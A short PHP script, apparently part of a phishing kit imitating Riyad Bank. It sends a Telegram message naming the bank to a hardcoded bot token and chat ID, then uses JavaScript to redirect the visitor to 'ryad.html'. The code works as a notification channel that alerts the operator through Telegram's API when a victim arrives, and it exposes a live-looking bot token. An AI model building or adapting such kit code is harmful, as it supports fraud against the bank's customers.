<?php
  $apiToken = "5713989974:AAHAwSTDfaZbuQ8gnp9v_y5Zbkgryx0QLCI";
  $data = [
      'chat_id' => '-690510241',
      'text' => 'بنك الرياض'
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
								 echo "<script> location.href='ryad.html'; </script>";
        exit;
    
?>